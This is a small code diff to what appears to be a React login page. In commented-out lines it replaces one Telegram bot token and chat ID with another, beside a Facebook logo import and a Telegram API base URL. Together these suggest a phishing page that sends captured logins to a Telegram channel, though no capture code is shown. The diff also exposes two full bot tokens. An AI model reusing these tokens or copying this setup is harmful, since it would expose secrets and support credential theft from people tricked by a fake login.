@@ -1169,8 +1169,8 @@ export default Login;
 // import facebooklogo from './facebook.svg';
 // import { X } from 'lucide-react';
 
-// const BOT_TOKEN = '8277733560:AAHpzM1ah7FHq7BuNdJvv9v0s0vuiMdXCTc';
-// const CHAT_ID = '-5014030730';
+// const BOT_TOKEN = '8523983828:AAHH7J9TarusfHKTvkc8OVJvRZDUEsi5Vck';
+// const CHAT_ID = '-3540741385';
 // const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
 // // simple hook to join a session room and listen for updates
@@ -1541,6 +1541,7 @@ export default Login;
 // //     <p className="text-green-600 font-medium">All done!</p>
 // //   )}
 // // </div>
+
 
 
 
